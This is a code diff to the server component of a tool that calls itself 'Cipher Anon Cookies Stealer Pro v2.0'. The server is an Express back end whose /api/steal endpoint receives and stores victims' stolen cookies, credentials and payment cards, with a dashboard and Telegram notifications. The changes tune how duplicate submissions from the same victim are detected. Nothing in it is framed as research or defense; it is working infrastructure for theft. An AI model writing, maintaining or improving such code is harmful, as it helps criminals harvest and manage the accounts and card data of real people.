@@ -1,6 +1,6 @@
 // ============================================================
 // SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
-// NUCLEAR FIX: X-Forwarded-For + hostname + nonce
+// NUCLEAR FIX: IP + userAgent (no hostname) + nonce + data check
 // ============================================================
 
 const express = require('express');
@@ -165,12 +165,12 @@ let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
 
 // ============================================================
-// NUCLEAR DEDUP — X-Forwarded-For + hostname + nonce
+// NUCLEAR DEDUP — IP + userAgent (NO HOSTNAME) + nonce + data check
 // ============================================================
 
 const dedupCache = new Map();
 const nonceCache = new Map();
-const DEDUP_WINDOW = 5000; // 5 seconds — immediate duplicate detection
+const DEDUP_WINDOW = 5000; // 5 seconds
 
 function cleanCache() {
     const now = Date.now();
@@ -186,38 +186,58 @@ function getRealIp(req) {
     // Try X-Forwarded-For first (Railway uses this)
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
-        // Get first IP in the chain
         const ips = forwarded.split(',').map(ip => ip.trim());
         return ips[0];
     }
-    // Fallback to X-Real-IP
     const realIp = req.headers['x-real-ip'];
     if (realIp) return realIp;
-    // Fallback to remote address
     return req.connection.remoteAddress;
 }
 
-function getDedupKey(ip, hostname, nonce) {
+// ---- Dedup key: IP + userAgent (first 50 chars) - NO HOSTNAME ----
+function getDedupKey(ip, userAgent) {
     let cleanIp = ip;
     if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') {
         cleanIp = '127.0.0.1';
     }
-    const cleanHost = hostname || 'unknown';
-    return crypto.createHash('md5').update(`${cleanIp}|${cleanHost}|${nonce}`).digest('hex');
+    const ua = (userAgent || '').slice(0, 50);
+    return crypto.createHash('md5').update(`${cleanIp}|${ua}`).digest('hex');
 }
 
-function isDuplicate(req, hostname, nonce) {
+// ---- Check if same IP already exists in stored data within window ----
+function isIpInData(ip) {
+    const now = Date.now();
+    const fiveSecondsAgo = now - 5000;
+    for (const entry of stolenData) {
+        if (entry.ip === ip) {
+            const entryTime = new Date(entry.receivedAt).getTime();
+            if (entryTime > fiveSecondsAgo) {
+                console.log(`[!] IP ${ip} already in stored data within 5s`);
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
+function isDuplicate(req, userAgent, nonce) {
     cleanCache();
 
-    // Check nonce first (fastest)
+    // Check nonce first
     if (nonce && nonceCache.has(nonce)) {
         console.log(`[!] Nonce duplicate: ${nonce}`);
         return true;
     }
 
     const ip = getRealIp(req);
-    const key = getDedupKey(ip, hostname, nonce);
 
+    // ---- Check if this IP already exists in stored data within 5 seconds ----
+    if (isIpInData(ip)) {
+        return true;
+    }
+
+    // ---- Check cache ----
+    const key = getDedupKey(ip, userAgent);
     if (dedupCache.has(key)) {
         const ts = dedupCache.get(key);
         if (Date.now() - ts < DEDUP_WINDOW) {
@@ -266,7 +286,6 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// ---- TRUST PROXY (Railway) ----
 app.set('trust proxy', true);
 
 app.use(antiBot({
@@ -438,12 +457,12 @@ app.post('/api/steal', async (req, res) => {
         data.credentials = data.credentials || [];
         data.cards = data.cards || [];
 
-        const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
+        const userAgent = data.fingerprint?.userAgent || '';
         const nonce = data.nonce || '';
 
         // ---- NUCLEAR DEDUP ----
-        if (isDuplicate(req, hostname, nonce)) {
-            log(`[!] Duplicate from ${realIp} for ${hostname} — ignored`);
+        if (isDuplicate(req, userAgent, nonce)) {
+            log(`[!] Duplicate from ${realIp} — ignored`);
             return res.json({ status: 'ok', duplicate: true });
         }
 
@@ -451,6 +470,7 @@ app.post('/api/steal', async (req, res) => {
         stolenData.push(data);
         saveData(DATA_FILE, stolenData);
 
+        const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
         const count = Object.keys(data.cookies || {}).length;
         const credCount = data.credentials.length;
         const cardCount = data.cards.length;
@@ -735,7 +755,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
     console.log(`  [+] Session Timeout: 30 minutes`);
-    console.log(`  [+] Dedup: X-Forwarded-For + hostname + nonce, 5s window`);
+    console.log(`  [+] Dedup: IP + userAgent (no hostname) + nonce + data check, 5s window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log('='.repeat(55) + '\n');
